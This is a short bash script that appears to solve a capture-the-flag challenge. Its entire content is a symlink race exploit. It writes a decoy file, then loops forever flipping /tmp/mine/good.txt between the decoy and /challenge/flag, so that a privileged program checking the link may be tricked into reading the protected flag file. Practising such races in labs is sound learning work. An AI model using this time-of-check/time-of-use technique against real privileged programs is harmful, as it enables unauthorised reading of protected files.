#!/bin/bash

echo "RANDOM" > /tmp/mine/random.txt

while true
do
    ln -sf /challenge/flag /tmp/mine/good.txt
    ln -sf /tmp/mine/random.txt /tmp/mine/good.txt
done

